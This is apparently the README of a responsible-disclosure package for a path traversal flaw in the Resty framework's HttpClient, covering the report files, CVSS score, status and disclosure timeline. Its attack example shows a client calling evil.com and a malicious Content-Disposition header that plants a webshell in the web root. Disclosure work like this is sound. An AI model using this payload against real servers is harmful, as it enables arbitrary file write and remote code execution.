# Resty HttpClient Path Traversal Vulnerability (CVE Pending)

## Directory Contents

This directory contains the complete CVE submission package for a critical path traversal vulnerability discovered in the Resty Framework's HttpClient module.

### Files

1. **report.md** - Detailed technical vulnerability report
   - Complete technical analysis
   - Proof-of-concept code
   - Attack scenarios and exploitation details
   - Remediation recommendations
   - Suitable for public disclosure after vendor notification

2. **cve_application.md** - CVE application form
   - Formatted for CVE numbering authority submission
   - All required fields completed
   - Ready to copy-paste into CVE request form

3. **README.md** - This file

## Vulnerability Summary

- **Vulnerability**: Path Traversal via Content-Disposition Header
- **Component**: Resty Framework - HttpClient Module
- **Affected Versions**: All versions ≤ 1.3.1.SNAPSHOT
- **CVSS Score**: 8.1 (HIGH)
- **Impact**: Arbitrary File Write → RCE, Privilege Escalation
- **Discovery Date**: 2025-11-01
- **Discoverer**: s1ain

## Key Findings

The HttpClient module automatically extracts filenames from HTTP response `Content-Disposition` headers without sanitization, allowing path traversal attacks. This is particularly critical because:

1. ✅ **Confirmed Exploitable** - No sanitization of `../` sequences
2. ✅ **Security Regression** - Framework's upload handler (MultipartParser) HAS protection, download handler does NOT
3. ✅ **Multiple Attack Vectors** - MITM, malicious servers, supply chain attacks
4. ✅ **High Impact** - Webshell deployment, SSH key injection, systemd backdoors

## Attack Scenario Example

```java
// Vulnerable code
HttpClient client = new HttpClient("http://evil.com");
client.build("/file").setDownloadFile("/app/temp/").get();

// Malicious response
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=../../../var/www/html/shell.jsp

// Result: Webshell written to web root instead of /app/temp/
```

## Status

- **Vendor Notification**: Pending (as of 2025-11-02)
- **CVE Application**: Submitted 2025-11-02
- **CVE Number**: Pending assignment
- **Public Disclosure**: Pending (90 days after vendor notification)
- **Patch Available**: No

## Usage Instructions

### For CVE Submission

Copy the contents of `cve_application.md` into the CVE request form at:
- MITRE CVE Request: https://cveform.mitre.org/
- Or through GitHub Security Advisory

### For Vendor Notification

Use `report.md` as the basis for responsible disclosure communication with the Dreampie/Resty maintainers.

### For Public Disclosure

After the 90-day disclosure period (or vendor patch release), `report.md` can be published to:
- Security mailing lists (oss-security, full-disclosure)
- Personal blog/security research site
- GitHub security advisory

## References

- **Vulnerable Code**: https://github.com/Dreampie/Resty/blob/master/resty-httpclient/src/main/java/cn/dreampie/client/HttpClient.java#L157-L178
- **CWE-22**: https://cwe.mitre.org/data/definitions/22.html
- **Project Repository**: https://github.com/Dreampie/Resty

## Responsible Disclosure Timeline

| Date | Event |
|------|-------|
| 2025-11-01 | Vulnerability discovered during security audit |
| 2025-11-02 | CVE application prepared and submitted |
| TBD | Vendor notification via GitHub security advisory |
| TBD + 90 days | Public disclosure deadline |
| TBD | Vendor patch release (if any) |

## Contact

**Researcher**: s1ain
**Disclosure Policy**: 90-day responsible disclosure period

---

**Note**: This vulnerability was discovered as part of a comprehensive security audit of the Resty framework. Multiple other vulnerabilities were identified and will be reported separately.
